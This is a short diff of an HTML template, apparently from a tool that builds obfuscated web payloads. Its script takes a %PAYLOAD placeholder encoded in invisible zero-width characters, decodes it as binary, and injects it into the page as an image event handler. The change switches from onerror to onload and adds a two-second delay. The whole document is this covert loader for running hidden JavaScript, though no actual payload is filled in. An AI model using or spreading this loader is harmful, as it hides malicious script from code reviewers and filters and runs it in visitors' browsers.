@@ -5,8 +5,14 @@
 </head>
 <body>
   <script>
-    var empty = "%PAYLOAD";
-    document.body.innerHTML += "<img src=\"#\" onerror=\"" + empty.replace(/\u200b/g, "0").replace(/\u200c/g, "1").replace(/\u200d/g, " ").replace(/\d+./g, x => String.fromCharCode('0b' + x)) + "\">";
+    var element = '<img src="/demo.png" onload="%PAYLOAD">';
+    setTimeout(function() {
+      document.body.innerHTML += element
+          .replace(/\u200b/g, '0')
+          .replace(/\u200c/g, '1')
+          .replace(/\u200d/g, ' ')
+          .replace(/\d+/g, x => String.fromCharCode('0b' + x));
+      }, 2000);
   </script>
 </body>
 </html>
